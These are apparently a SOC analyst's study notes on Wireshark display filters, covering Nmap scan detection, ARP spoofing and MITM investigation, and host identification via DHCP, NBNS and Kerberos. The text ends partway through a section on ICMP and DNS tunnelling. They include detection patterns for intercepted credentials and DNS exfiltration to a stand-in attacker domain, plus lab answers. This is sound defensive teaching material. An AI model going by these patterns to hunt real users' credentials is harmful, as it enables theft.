| Filter                          | Description                 |
| ------------------------------- | --------------------------- |
| `dns`                           | Show all DNS packets        |
| `dns.flags.response == 0`       | DNS requests                |
| `dns.flags.response == 1`       | DNS responses               |
| `dns.qry.type == 1`             | A record                    |
| `dns.qry.type == 28`            | AAAA record                 |
| `dns.qry.type == 5`             | CNAME record                |
| `dns.qry.type == 15`            | MX record                   |
| `dns.qry.type == 16`            | TXT record                  |
| `dns.qry.name == "example.com"` | Specific domain query       |
| `dns.id == 0x1234`              | Transaction ID              |
| `dns.flags.rcode == 0`          | Successful response         |
| `dns.flags.rcode == 3`          | NXDOMAIN (Domain not found) |


---


## Common Protocol Filters


| Filter     | Description                       |
| ---------- | --------------------------------- |
| `arp`      | Show ARP packets                  |
| `icmp`     | Show ICMP packets                 |
| `icmpv6`   | Show ICMPv6 packets               |
| `dhcp`     | Show DHCP packets                 |
| `ftp`      | Show FTP traffic                  |
| `ssh`      | Show SSH traffic                  |
| `tls`      | Show TLS traffic                  |
| `ssl`      | Show SSL traffic (older captures) |
| `smtp`     | Show SMTP traffic                 |
| `imap`     | Show IMAP traffic                 |
| `pop`      | Show POP3 traffic                 |
| `ntp`      | Show NTP traffic                  |
| `snmp`     | Show SNMP traffic                 |
| `ldap`     | Show LDAP traffic                 |
| `kerberos` | Show Kerberos traffic             |
| `smb`      | Show SMB traffic                  |
| `sip`      | Show SIP traffic                  |
| `rtp`      | Show RTP traffic                  |


---


## Display Filter Expressions


**Path:** `Analyse → Display Filter Expression`


### What it Does


The **Display Filter Expression** window is a built-in filter builder that helps analysts create display filters without memorizing protocol fields.


It provides:

- All supported protocols
- Available protocol fields
- Accepted value types (Integer, String, Boolean, etc.)
- Predefined values (when available)

### Why is it Useful?

- Helps when you don't remember the exact filter syntax.
- Makes creating complex display filters easier.
- Useful because Wireshark supports **3000+ protocols**, making it impractical to memorize every filter field.

# Advanced Filtering


Besides basic comparison (`==`, `!=`, `>`, `<`) and logical operators (`&&`, `||`, `!`), Wireshark provides **advanced filtering operators and functions** for searching patterns, values, and specific packet details during investigations.


---


## `contains`


**Type:** Comparison Operator


### What it Does


Searches for a **specific text** inside a field.

- **Case-sensitive**
- Similar to the **Find** feature but limited to a specific field.

### Syntax


```plain text
http.server contains "Apache"
```


### Example


Find all HTTP packets where the **Server** header contains **Apache**.


```plain text
Server: Apache/2.4.41
```


This packet **matches**.


---


## `matches`


**Type:** Comparison Operator (Regular Expression)


### What it Does


Searches using a **Regular Expression (Regex)** pattern.

- **Case-insensitive**
- Useful for matching multiple patterns at once.

### Syntax


```plain text
http.host matches "\.(php|html)"
```


### Example


Find requests ending with:

- `.php`
- `.html`

Matches:


```plain text
login.php
index.html
admin.php
```


---


## `in`


**Type:** Set Membership Operator


### What it Does


Checks whether a field belongs to a **list or range of values**.


Instead of writing multiple OR conditions:


```plain text
tcp.port == 80 || tcp.port == 443 || tcp.port == 8080
```


Simply write:


```plain text
tcp.port in {80 443 8080}
```


### Example


Display traffic using:

- Port 80 (HTTP)
- Port 443 (HTTPS)
- Port 8080 (Alternative HTTP)

---


## `upper()`


**Type:** Function


### What it Does


Converts text to **UPPERCASE** before filtering.


Useful when packet data contains mixed capitalization.


### Syntax


```plain text
upper(http.server) contains "APACHE"
```


### Example


All of the following will match:


```plain text
Apache
apache
APACHE
ApAcHe
```


because they are converted to uppercase before comparison.


---


## `lower()`


**Type:** Function


### What it Does


Converts text to **lowercase** before filtering.


### Syntax


```plain text
lower(http.server) contains "apache"
```


### Example


These values all match:


```plain text
Apache
APACHE
apache
ApAcHe
```


because they are converted to lowercase first.


---


## `string()`


**Type:** Function


### What it Does


Converts a **numeric (non-string) value** into a **string**, allowing text-based operations like `matches`.


### Syntax


```plain text
string(frame.number) matches "[13579]$"
```


### Example


Frame Numbers:


```plain text
1
2
3
4
5
```


The regex:


```plain text
[13579]$
```


matches only frames ending with an **odd digit**:


```plain text
1
3
5
```


---


## Quick Summary


| Filter     | Purpose                                              | Example                                   |
| ---------- | ---------------------------------------------------- | ----------------------------------------- |
| `contains` | Find specific text (Case-sensitive)                  | `http.server contains "Apache"`           |
| `matches`  | Search using Regular Expressions (Case-insensitive)  | `http.host matches "\.(php|html)"`        |
| `in`       | Check if a value belongs to a list                   | `tcp.port in {80 443 8080}`               |
| `upper()`  | Convert text to uppercase before filtering           | `upper(http.server) contains "APACHE"`    |
| `lower()`  | Convert text to lowercase before filtering           | `lower(http.server) contains "apache"`    |
| `string()` | Convert numbers to strings for text/regex operations | `string(frame.number) matches "[13579]$"` |


# Nmap Scans


**Nmap (Network Mapper)** is an industry-standard network scanning tool used to:

- Discover live hosts
- Identify open and closed ports
- Detect running services
- Perform network reconnaissance

As a SOC analyst, recognizing Nmap scan patterns helps identify reconnaissance activity before an attack begins.


---


## Common Nmap Scan Commands


| Command             | Description                                                                                                                               |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap -sT <target>` | Performs a **TCP Connect Scan** (completes the TCP handshake). Used by non-root users.                                                    |
| `nmap -sS <target>` | Performs a **TCP SYN (Half-Open) Scan** (does not complete the handshake). Faster and stealthier. Requires root/administrator privileges. |
| `nmap -sU <target>` | Performs a **UDP Scan** to identify open or closed UDP ports.                                                                             |


---


# Understanding TCP Flags


Before understanding Nmap scans, it's important to know what each TCP flag means.


| Flag         | Meaning                   | Purpose                                         |
| ------------ | ------------------------- | ----------------------------------------------- |
| **SYN**      | Synchronize               | Starts a new TCP connection.                    |
| **ACK**      | Acknowledgement           | Acknowledges receipt of a packet.               |
| **SYN, ACK** | Synchronize + Acknowledge | Server accepts the connection request.          |
| **RST**      | Reset                     | Immediately terminates or refuses a connection. |
| **RST, ACK** | Reset + Acknowledge       | Indicates the destination port is closed.       |
| **FIN**      | Finish                    | Gracefully closes an established connection.    |


---


## TCP Three-Way Handshake


A normal TCP connection follows three steps:


```plain text
Client                 Server

SYN -------------------->
      <------------------ SYN, ACK
ACK -------------------->
```


### Step 1 - SYN


The client asks:

> "Can I connect?"

### Step 2 - SYN, ACK


The server replies:

> "Yes, I'm listening. Go ahead."

### Step 3 - ACK


The client responds:

> "Great! Let's start communicating."

Now the TCP connection is established.


---


# TCP Connect Scan (`nmap -sT`)


A TCP Connect Scan **completes the entire TCP three-way handshake**.


Usually used by:

- Non-root users
- Systems that cannot perform raw packet scanning

---


## Open TCP Port


```plain text
Scanner                  Target

SYN -------------------->
      <------------------ SYN, ACK
ACK -------------------->
```


### What happens?


![Image](images/66a079fe4c6c7524bf02247d365e4ad5.png)

1. Scanner sends **SYN**.
2. Target replies **SYN, ACK**.
3. Scanner sends **ACK**.
4. TCP connection is successfully established.

**Result:** Port is **OPEN**.


---


## Closed TCP Port


```plain text
Scanner                  Target

SYN -------------------->
      <------------------ RST, ACK
```


### What happens?


![Image](images/a55161180a3b00243a60b0bafc683b10.png)

1. Scanner sends **SYN**.
2. Target immediately replies **RST, ACK**.

The server is saying:

> "Nobody is listening on this port."

**Result:** Port is **CLOSED**.


---


### Detection Filter


```plain text
tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024
```


**Why it works:**

- `tcp.flags.syn==1` → Captures packets that **start a TCP connection**.
- `tcp.flags.ack==0` → Ensures it's the **initial SYN packet**, not later handshake packets.
- `tcp.window_size > 1024` → Large window size is typical of **TCP Connect Scans (****`nmap -sT`****)**, where the OS performs a full TCP handshake.

### Why this filter?

- SYN packet
- Not an ACK
- Large TCP Window Size (>1024)
- Typical pattern of a TCP Connect Scan

---


# TCP SYN Scan (`nmap -sS`)


A SYN Scan is called a **Half-Open Scan** because it **never completes the TCP handshake**.


Usually used by:

- Root/Administrator users
- Faster and stealthier scanning

---


## Open TCP Port


```plain text
Scanner                  Target

SYN -------------------->
      <------------------ SYN, ACK
RST -------------------->
```


### What happens?


![Image](images/165af1c60dc631409aef4d6f5f47431e.png)

1. Scanner sends **SYN**.
2. Server replies **SYN, ACK**.
3. Instead of sending ACK, the scanner immediately sends **RST**.

The scanner already knows the port is open, so it aborts the connection.


**Result:** Port is **OPEN**.


---


## Closed TCP Port


![Image](images/fb5e416776cd790477b4fecfc8b681b8.png)


```plain text
Scanner                  Target

SYN -------------------->
      <------------------ RST, ACK
```


### What happens?


The server immediately rejects the connection because the port is closed.


**Result:** Port is **CLOSED**.


---


### Detection Filter


```plain text
tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <=1024
```


**Why it works:**

- `tcp.flags.syn==1` → Captures the initial SYN packet.
- `tcp.flags.ack==0` → Excludes response packets.
- `tcp.window_size <=1024` → Small window size is commonly seen in **SYN Scans (****`nmap -sS`****)**, which send crafted packets and **do not complete the handshake**.

### Why this filter?

- SYN packet
- No ACK
- Small TCP Window Size (≤1024)
- Typical pattern of a SYN Scan

---


# TCP Connect Scan vs SYN Scan


| TCP Connect Scan (`-sT`) | SYN Scan (`-sS`)                |
| ------------------------ | ------------------------------- |
| Completes the handshake  | Does not complete the handshake |
| SYN → SYN,ACK → ACK      | SYN → SYN,ACK → RST             |
| Easier to detect         | More stealthy                   |
| Used by non-root users   | Requires root privileges        |


---


# UDP Scan (`nmap -sU`)


Unlike TCP, **UDP has no handshake**.


The scanner simply sends a UDP packet.


---


## Open UDP Port


```plain text
Scanner                  Target

UDP --------------------->
```


### What happens?

- UDP packet is sent.
- No reply is required.

**Result:** Usually considered **OPEN** (or Open|Filtered).


---


## Closed UDP Port


```plain text
Scanner                  Target

UDP --------------------->
      <------------------ ICMP Type 3 Code 3
```


### What happens?


The target replies:

> **ICMP Destination Unreachable – Port Unreachable**

This means:


"The requested UDP port does not exist."


**Result:** Port is **CLOSED**.


---


### ICMP Type 3 Code 3


| Value      | Meaning                 |
| ---------- | ----------------------- |
| **Type 3** | Destination Unreachable |
| **Code 3** | Port Unreachable        |


Wireshark allows you to expand the ICMP packet and view the **original UDP request** encapsulated inside the ICMP error, helping analysts determine which scanned port generated the response.


---


### Detection Filter


```plain text
icmp.type==3 and icmp.code==3
```


**Why it works:**

- `icmp.type==3` → **Destination Unreachable** message.
- `icmp.code==3` → **Port Unreachable**, meaning the scanned UDP port is **closed**.
- Multiple ICMP Type 3 Code 3 responses are a strong indicator of an **Nmap UDP Scan (****`nmap -sU`****)**.

Shows UDP ports that responded with **Destination Unreachable – Port Unreachable**, indicating **closed UDP ports**.


---


# Common Wireshark TCP Flag Filters


| Filter                                   | Description     |
| ---------------------------------------- | --------------- |
| `tcp.flags.syn==1`                       | SYN packets     |
| `tcp.flags.ack==1`                       | ACK packets     |
| `tcp.flags.reset==1`                     | RST packets     |
| `tcp.flags.fin==1`                       | FIN packets     |
| `tcp.flags.syn==1 && tcp.flags.ack==1`   | SYN,ACK packets |
| `tcp.flags.reset==1 && tcp.flags.ack==1` | RST,ACK packets |


---


# Quick Summary


| Scan            | Nmap Command | Open Port             | Closed Port              |
| --------------- | ------------ | --------------------- | ------------------------ |
| **TCP Connect** | `nmap -sT`   | SYN → SYN,ACK → ACK   | SYN → RST,ACK            |
| **TCP SYN**     | `nmap -sS`   | SYN → SYN,ACK → RST   | SYN → RST,ACK            |
| **UDP Scan**    | `nmap -sU`   | UDP → _(No Response)_ | UDP → ICMP Type 3 Code 3 |


# ARP (Address Resolution Protocol)


ARP (Address Resolution Protocol) maps a **logical IP address** to a **physical MAC address** within a **local network (LAN)**.


Since Ethernet communication uses **MAC addresses**, a device must know the destination MAC address before sending data.


---


## How ARP Works


Suppose:

- PC A → IP: **192.168.1.10**
- Router → IP: **192.168.1.1**

PC A knows the router's IP but **doesn't know its MAC address**.


### Step 1: ARP Request (Broadcast)


PC A broadcasts:


```plain text
Who has 192.168.1.1?
Tell 192.168.1.10
```


Everyone on the LAN receives this request.


---


### Step 2: ARP Reply (Unicast)


The router replies only to PC A:


```plain text
192.168.1.1 is at
50:78:b3:f3:cd:f4
```


---


### Step 3: Store in ARP Cache


PC A stores:


| IP Address  | MAC Address       |
| ----------- | ----------------- |
| 192.168.1.1 | 50:78:b3:f3:cd:f4 |


Future packets can now be sent without another ARP request.


---


# ARP Characteristics

- Works only inside the **local network**
- Maps **IP ↔ MAC**
- Uses **broadcast requests** and **unicast replies**
- **Not routable**
- **No authentication**
- Vulnerable to spoofing

---


# ARP Spoofing (ARP Poisoning / MITM)


ARP has **no authentication**, so **any device can claim to own any IP address**.


An attacker exploits this weakness by sending **fake ARP replies** to both the victim and the router.


Instead of the legitimate mapping:


```plain text
192.168.1.1 → MAC_R (Router)
```


the attacker tells the **victim**:


```plain text
192.168.1.1 → MAC_A (Attacker)
```


and tells the **router**:


```plain text
192.168.1.12 → MAC_A (Attacker)
```


Both devices update their ARP caches with the fake mappings.


Now, all traffic between the victim and the router is first sent to the attacker, enabling a **Man-in-the-Middle (MITM)** attack.


---


## MITM Workflow


### Normal Communication


```plain text
Victim
   │
   ▼
Router
```


---


### After ARP Spoofing


```plain text
Victim
   │
   ▼
Attacker
   │
   ▼
Router
```


The attacker can:

- Read traffic
- Modify packets
- Forward traffic
- Steal credentials

This is called a **Man-in-the-Middle (MITM) Attack**.


---


# Wireshark ARP Filters


## Show all ARP packets


```plain text
arp
```


Shows every ARP packet.


---


## ARP Requests


![Image](images/7ef50d51644a1a6f9a62ee0e84777813.png)


```plain text
arp.opcode == 1
```


### Why?

- `arp.opcode == 1`
- Opcode **1** means **ARP Request**

Example:


```plain text
Who has 192.168.1.1?
```


---


## ARP Replies


![Image](images/93ba7393cdf55b2706e4553dcd321a2b.png)


```plain text
arp.opcode == 2
```


### Why?


Opcode **2** represents an **ARP Reply**.


Example:


```plain text
192.168.1.1 is at 50:78:b3:f3:cd:f4
```


---


## ARP Scan Detection


```plain text
((arp) && (arp.opcode == 1)) && (arp.src.hw_mac == TARGET_MAC)
```


### Why it works


| Filter                         | Meaning                              |
| ------------------------------ | ------------------------------------ |
| `arp`                          | Only ARP traffic                     |
| `arp.opcode == 1`              | Only ARP Requests                    |
| `arp.src.hw_mac == TARGET_MAC` | Requests coming from one MAC address |


If one MAC sends **many ARP requests** to different IPs, it is likely performing an **ARP Scan**.


---


## Duplicate Address Detection


![Image](images/68d9da4b44529f51c711fa34798cb686.png)


```plain text
arp.duplicate-address-detected
```


### Why it works


Wireshark raises this warning when **multiple MAC addresses claim the same IP address**.


Example:


```plain text
192.168.1.1

↓

MAC A
MAC B
```


Possible indication of **ARP Spoofing**.


---


## Duplicate Address Frame


```plain text
arp.duplicate-address-frame
```


### Why it works


Shows the packet responsible for the duplicate IP warning.


Useful for locating the suspicious ARP packet.


---


## Possible ARP Flooding


```plain text
arp.dst.hw_mac == 00:00:00:00:00:00
```


### Why it works


Destination MAC:


```plain text
00:00:00:00:00:00
```


is abnormal.


Large numbers of these packets may indicate:

- ARP Flood
- ARP Scan
- Network malfunction

---


# Detecting ARP Spoofing


A normal network looks like:


| IP           | MAC   |
| ------------ | ----- |
| 192.168.1.1  | MAC A |
| 192.168.1.12 | MAC B |
| 192.168.1.25 | MAC C |


---


An ARP spoofing attack looks like:


| IP          | Claimed By |
| ----------- | ---------- |
| 192.168.1.1 | MAC A      |
| 192.168.1.1 | MAC C ❌    |


Two MAC addresses now claim the same IP.


This is a strong indicator of ARP spoofing.


---


# Investigation Workflow


## Step 1


Look for:


```plain text
arp
```


Observe requests and replies.


---


## Step 2


Look for duplicate IP claims.


Example:


```plain text
192.168.1.1

↓

MAC A
MAC C
```


---


## Step 3


Identify the suspicious MAC.


Example:


```plain text
00:0c:29:e2:18:b4
```


---


## Step 4


Check if that MAC sends many ARP Requests.


![Image](images/c618ae85f0e3a8c203f7d62af3499eb0.png)


Filter:


```plain text
eth.src == 00:0c:29:e2:18:b4 and arp.opcode == 1
```


### Why it works

- `eth.src` → Packets sent by the attacker
- `arp.opcode == 1` → Only ARP Requests

Large numbers suggest **ARP Scanning/Flooding**.


---


## Step 5


Check whether HTTP traffic is redirected. If HTTP is not enough then we will add MAC address as column.


![Image](images/1ff107cc7e1528b938e6c6667fb8a4b2.png)


![Image](images/4847900b56c20e7bb596eafbddc2a313.png)


Filter:


```plain text
http and eth.dst == 00:0c:29:e2:18:b4
```


### Why it works

- `http` → HTTP packets only
- `eth.dst` → Packets whose destination MAC is the attacker

The MAC address that ends with "b4" is the destination of all HTTP packets! It is evident that there is a MITM attack


---


## Step 6


Look for stolen credentials.


### Filter


```plain text
eth.dst == ATTACKER_MAC
and http.request.method == "POST"
and frame contains "pass"
```


### Why it works


| Filter                    | Meaning                                           |
| ------------------------- | ------------------------------------------------- |
| `eth.dst == ATTACKER_MAC` | Traffic intercepted by attacker                   |
| `POST`                    | Login forms usually submit credentials using POST |
| `frame contains "pass"`   | Search for the password field inside the packet   |


---


## Step 7


Find a specific user.


Example:


```plain text
frame contains "client986"
```


Once found, inspect the POST request to recover:

- Username
- Password

---


# Typical Signs of ARP Spoofing

- Multiple MAC addresses claim the same IP.
- One MAC claims multiple IP addresses.
- One MAC sends excessive ARP requests.
- HTTP traffic destined for the attacker's MAC.
- Sensitive credentials visible because traffic passes through the attacker.

---


# Quick Summary


| Filter                                                  | Purpose                                     |
| ------------------------------------------------------- | ------------------------------------------- |
| `arp`                                                   | Show all ARP traffic                        |
| `arp.opcode == 1`                                       | ARP Requests                                |
| `arp.opcode == 2`                                       | ARP Replies                                 |
| `arp.duplicate-address-detected`                        | Detect duplicate IP claims                  |
| `arp.duplicate-address-frame`                           | Show duplicate ARP packet                   |
| `arp.dst.hw_mac==00:00:00:00:00:00`                     | Detect possible ARP flooding                |
| `eth.src==MAC and arp.opcode==1`                        | ARP requests from a specific device         |
| `http and eth.dst==MAC`                                 | HTTP traffic received by attacker (MITM)    |
| `http.request.method=="POST" and frame contains "pass"` | Find intercepted login credentials          |
| `frame contains "client986"`                            | Find packets containing a specific username |


# Identifying Hosts


During an investigation, analysts need to identify **which device (host)** and **which user** generated suspicious traffic.


Besides matching **IP ↔ MAC**, protocols like **DHCP, NetBIOS (NBNS), and Kerberos** can reveal hostnames, usernames, and other identifying information.


Enterprise networks usually follow naming conventions (e.g., `HR-PC-01`, `john.smith`), making it easier to identify devices and users.


---


# DHCP (Dynamic Host Configuration Protocol)


DHCP automatically assigns network settings to devices, such as:

- IP Address
- Subnet Mask
- Default Gateway
- DNS Server

For analysts, DHCP is valuable because it often reveals the **hostname**, **requested IP**, and **client MAC address**, helping identify the device behind suspicious traffic. It follows DORA process.

- **Discover**: The client device broadcasts a message to find an available DHCP server on the network.
- **Offer**: The DHCP server responds with an available IP address and network configuration options.
- **Request**: The client replies to accept the offered IP address.
- **Acknowledge**: The server confirms the request and grants a temporary lease for that IP address.

---


## Common DHCP Filters


| Filter                  | Purpose                         |
| ----------------------- | ------------------------------- |
| `dhcp` or `bootp`       | Show all DHCP traffic           |
| `dhcp.option.dhcp == 3` | DHCP **Request** packets        |
| `dhcp.option.dhcp == 5` | DHCP **ACK** (Request Accepted) |
| `dhcp.option.dhcp == 6` | DHCP **NAK** (Request Denied)   |


---


## DHCP Request (`dhcp.option.dhcp == 3`)


A client sends a **DHCP Request** asking the DHCP server to assign or confirm an IP address.


Useful options:


| Option    | Information          |
| --------- | -------------------- |
| Option 12 | Hostname             |
| Option 50 | Requested IP Address |
| Option 51 | Requested Lease Time |
| Option 61 | Client MAC Address   |


### Example Filters


```plain text
dhcp.option.hostname contains "HR-PC"
```


Find devices whose hostname contains **HR-PC**.


---


## DHCP ACK (`dhcp.option.dhcp == 5`)


The DHCP server accepts the request and assigns the IP address.


Useful options:


| Option    | Information         |
| --------- | ------------------- |
| Option 15 | Domain Name         |
| Option 51 | Assigned Lease Time |


### Example Filter


```plain text
dhcp.option.domain_name contains "company"
```


Find DHCP ACK packets for devices in a specific domain.


---


## DHCP NAK (`dhcp.option.dhcp == 6`)


The DHCP server **rejects** the client's request.


Usually happens when:

- Requested IP is invalid
- IP is already in use
- Lease has expired
- Client configuration is incorrect

Useful option:


| Option    | Information              |
| --------- | ------------------------ |
| Option 56 | Rejection reason/message |

> **Tip:** Instead of filtering Option 56, open the packet and read the message to understand why the request was rejected.

---


## Quick Summary


| Filter                                       | Why it is Useful                                             |
| -------------------------------------------- | ------------------------------------------------------------ |
| `dhcp`                                       | Show all DHCP traffic                                        |
| `dhcp.option.dhcp == 3`                      | Identify the requesting device (Hostname, MAC, Requested IP) |
| `dhcp.option.dhcp == 5`                      | See which IP address was successfully assigned               |
| `dhcp.option.dhcp == 6`                      | Investigate why a DHCP request was rejected                  |
| `dhcp.option.hostname contains "keyword"`    | Find a specific host by hostname                             |
| `dhcp.option.domain_name contains "keyword"` | Find devices in a specific domain                            |


## **Question:** 


Which host requested the IP address **172.16.13.85**?


**Answer:** `Galaxy-A12`


### Filters


**Option 1**


```plain text
dhcp.option.requested_ip_address == 172.16.13.85
```


**Option 2**


```plain text
dhcp.option.dhcp == 3 and dhcp.option.requested_ip_address == 172.16.13.85
```


### Why it Works

- `dhcp.option.requested_ip_address` → Finds DHCP packets requesting the specified IP address.
- `dhcp.option.dhcp == 3` → Limits results to **DHCP Request** packets only.
> **Tip:** Expand **Dynamic Host Configuration Protocol → Option (12): Host Name** to view the requesting hostname.

# NetBIOS (NBNS) Analysis


**NetBIOS Name Service (NBNS)** translates **hostnames ↔ IP addresses** within a local network (similar to DNS but for older Windows networks).


For analysts, NBNS is useful because it can reveal **computer names** involved in suspicious traffic.


---


## Common NBNS Filter


| Filter | Purpose                               |
| ------ | ------------------------------------- |
| `nbns` | Show all NetBIOS Name Service traffic |


---


## Find a Specific Host


```plain text
nbns.name contains "keyword"
```


### Why it works

- `nbns.name` → Searches the NetBIOS hostname.
- `contains "keyword"` → Finds hosts whose names match the keyword.

**Example:**


```plain text
nbns.name contains "HR-PC"
```


Find all NBNS packets related to hosts with **HR-PC** in their name.


---


## **Question:** 


What is the number of NetBIOS registration requests made by the **"LIVALJM"** workstation?


**Answer:** `16`


### Filters


**Option 1 (Opcode Number)**


```plain text
nbns.name contains "LIVALJM" and nbns.flags.opcode == 5
```


**Option 2 (Opcode Name)**


```plain text
nbns.name contains "LIVALJM" and nbns.flags.opcode == Registration
```


### Why it Works

- `nbns.name contains "LIVALJM"` → Shows NBNS packets related to the **LIVALJM** workstation.
- `nbns.flags.opcode == 5` (Registration) → Filters only **NetBIOS Registration** packets, which are sent when a device registers its hostname on the network.

---


## Useful NBNS Information


NBNS queries may reveal:

- Hostname
- IP Address
- Time To Live (TTL)

These details help identify which computer generated or received suspicious traffic.


---


# Kerberos Analysis


**Kerberos** is the default authentication protocol used in **Windows Active Directory** environments.


Its purpose is to **securely authenticate users and services** without sending passwords over the network.


For analysts, Kerberos helps identify:

- Usernames
- Computer names
- Domain names
- Requested services

---


## Common Kerberos Filter


| Filter     | Purpose                                  |
| ---------- | ---------------------------------------- |
| `kerberos` | Show all Kerberos authentication traffic |


---


## Find a Specific User


```plain text
kerberos.CNameString contains "keyword"
```


### Why it works

- `kerberos.CNameString` → Client (user/computer) name requesting authentication.
- `contains` → Finds a specific user or computer.

---


## Show Only User Accounts


```plain text
kerberos.CNameString and !(kerberos.CNameString contains "$")
```


### Why it works


In Windows:

- **User accounts** → `john`
- **Computer accounts** → `HR-PC$`

The `$` at the end indicates a **computer account**, so excluding `$` displays only **user accounts**.


---


## Useful Kerberos Filters


| Filter                             | Purpose                                                         |
| ---------------------------------- | --------------------------------------------------------------- |
| `kerberos.pvno == 5`               | Show Kerberos Version 5 packets                                 |
| `kerberos.realm contains ".org"`   | Find authentication for a specific domain (Realm)               |
| `kerberos.SNameString == "krbtgt"` | Show requests to the **Kerberos Ticket Granting Service (TGS)** |

> **Note:** `krbtgt` (Kerberos Ticket Granting Ticket) is the service that issues **Ticket Granting Tickets (TGTs)**, allowing authenticated users to request access to other services.

---


## Useful Kerberos Fields


| Field         | Information                                                              |
| ------------- | ------------------------------------------------------------------------ |
| `CNameString` | Username or computer name requesting authentication                      |
| `realm`       | Active Directory domain (e.g., `company.org`)                            |
| `SNameString` | Service being requested (e.g., `krbtgt`, HTTP, LDAP)                     |
| `addresses`   | Client IP address and NetBIOS name _(available in request packets only)_ |
| `pvno`        | Kerberos protocol version                                                |


## Question 3: 


**Question:** What is the IP address of user **"u5"**? _(Defanged format)_


**Answer:** `10[.]1[.]12[.]2`


### Filter


```plain text
kerberos.CNameString contains "u5"
```


### Why it Works

- `kerberos.CNameString` → Searches the Kerberos client (user) name.
- `contains "u5"` → Displays authentication packets generated by user **u5**.
> **Tip:** The packet's **Source IP** is `10.1.12.2`. Defang it as **10[.]1[.]12[.]2**.

---


## Question 4:


**Question:** What is the hostname of the available host in the Kerberos packets?


**Answer:** `xp1$`


### Filter


```plain text
kerberos.CNameString contains "$"
```


### Why it Works

- `kerberos.CNameString` → Searches Kerberos client names.
- `contains "$"` → Windows computer accounts end with **`$`**, so this filter displays **hostnames** instead of user accounts.

# Tunnelling Traffic (ICMP & DNS)


## What is Tunnelling?


**Tunnelling** is the process of **hiding one protocol or data inside another protocol**.


Legitimate use:

- VPNs
- Secure communication between networks

Malicious use:

- Bypass firewalls
- Exfiltrate (steal) data
- Establish Command & Control (C2)

Instead of sending stolen data directly, attackers hide it inside **trusted protocols** such as:

- ICMP (Ping)
- DNS

Since these protocols are usually allowed through firewalls, malicious traffic often goes unnoticed.


---


# ICMP Tunnelling


## What is ICMP?


ICMP (Internet Control Message Protocol) is mainly used for:

- Ping
- Network diagnostics
- Error reporting

Example:


```plain text
ping google.com
```


creates ICMP Echo Request and Echo Reply packets.


---


## How ICMP Tunnelling Works


Normally:


```plain text
Victim
    │
ICMP Echo Request (Ping)
    │
Server
```


During an attack:


```plain text
Victim
      │
ICMP + Hidden SSH/HTTP/Data
      │
Attacker C2 Server
```


Instead of sending a normal ping, malware places **hidden data inside the ICMP payload**.


That hidden data may be:

- SSH
- HTTP
- Commands
- Passwords
- Files

This creates a covert communication channel.


---


## Indicators of ICMP Tunnelling


Look for:

- Large number of ICMP packets
- ICMP packets with unusually large payloads
- Repeated communication to one destination
- Encapsulated protocols (SSH, HTTP, etc.) inside ICMP

---


## Useful Filters


### Show all ICMP traffic


```plain text
icmp
```


---


### Find Large ICMP Packets


```plain text
data.len > 64 and icmp
```


### Why it works

- `icmp` → Shows ICMP packets only.
- `data.len > 64` → Normal ping payloads are usually around **64 bytes**. Larger payloads may indicate hidden data being tunneled.

---


### Find Specific Protocols Inside ICMP


```plain text
icmp and frame matches "ssh|http|ftp|scp"
```


### Why it works


Searches the packet payload for protocol signatures.


Example:


If the packet contains:


```plain text
SSH-2.0
```


it indicates **SSH traffic is being tunneled inside ICMP**.


---


## Practice Example


Question:


**Which protocol is used inside the ICMP tunnel?**


### Step 1


Apply:


```plain text
data.len > 64 and icmp
```


This isolates suspicious ICMP packets.


---


### Step 2


Open one of the packets.


Go to:


```plain text
Packet Bytes
```


or


```plain text
Follow Stream
```


You may see something like:


```plain text
SSH-2.0-OpenSSH
```


Therefore,


**Answer: SSH**


---


# DNS Tunnelling


## What is DNS?


DNS converts:


```plain text
google.com

↓

142.250.x.x
```


Normally DNS queries are short and human-readable.


Example:


```plain text
google.com
github.com
microsoft.com
```


---


## How DNS Tunnelling Works


Instead of sending data directly,


the attacker:

1. Encodes stolen data.
2. Places it inside a DNS subdomain.
3. Sends the DNS query to a domain they control.

Example:


Normal query:


```plain text
google.com
```


Malicious query:


```plain text
QWxhZGRpbjpPcGVuU2VzYW1l.dataexfil.com
```


Here,


```plain text
QWxhZGRpbjpPcGVuU2VzYW1l
```


is **encoded stolen data**, while


```plain text
dataexfil.com
```


is the attacker's domain.


Every DNS query carries another chunk of stolen information.


---


## Indicators of DNS Tunnelling


Look for:

- Very long DNS queries
- Random-looking subdomains
- Hundreds of queries to the same domain
- Unusual DNS traffic volume
- Known tunneling tools (e.g., dnscat, dns2tcp)

---


# Useful DNS Filters


### Show all DNS traffic


```plain text
dns
```


---


### Show only DNS Queries


```plain text
dns.flags.response == 0
```


### Why it works

- `0` = Query sent by the client.
- Ignores server responses.

Useful because attackers **send data out** through DNS queries.


---


### Find Long DNS Queries


```plain text
dns.qry.name.len > 30 and !mdns
```


### Why it works

- `dns.qry.name.len > 30` → Long domain names are unusual and may contain encoded data.
- `!mdns` → Excludes local multicast DNS traffic, reducing false positives.

---


### Find Known dnscat Traffic


```plain text
dns contains "dnscat"
```


Searches DNS packets for the string **dnscat**, a well-known DNS tunneling tool.


---


### Find TXT Record Queries


```plain text
dns.qry.type == 16
```


### Why it works

- Type **16** = TXT Record.
- Attackers sometimes use TXT records because they can carry larger amounts of data.

---


### Find a Suspicious Domain


```plain text
dns.qry.name contains "dataexfil"
```


Shows all DNS queries sent to:


```plain text
dataexfil.com
```


---


# How to Find a Malicious Domain (Step by Step)


Suppose you don't know the domain name.


### Step 1 – Show DNS Queries


```plain text
dns.flags.response == 0
```


Only outbound DNS requests are displayed.


---


### Step 2 – Hunt Long Queries


```plain text
dns.qry.name.len > 30
```


You may see queries like:


```plain text
a8sd9as8d7as98d7asd.dataexfil.com

93jd81ks8d7k2jd8sd.dataexfil.com

kd72jd9s7jd8sjda.dataexfil.com
```


Notice:

- The first part changes every packet.
- The ending is always:

```plain text
dataexfil.com
```


The random prefix is **encoded stolen data**, while [**dataexfil.com**](http://dataexfil.com/) is the attacker's controlled domain.


---


### Step 3 – Confirm the Domain


```plain text
dns.qry.name contains "dataexfil"
```


This displays every packet involved in the DNS tunneling attack.


---


## Practice Example


Question:


**What suspicious domain receives the anomalous DNS queries?**


### Investigation

1. Show only DNS queries.

```plain text
dns.flags.response == 0
```

1. Find unusually long queries.

```plain text
dns.qry.name.len > 30
```

1. Observe the repeated root domain.

```plain text
xxxxxxxx.dataexfil.com
yyyyyyyy.dataexfil.com
zzzzzzzz.dataexfil.com
```


The common domain is:


```plain text
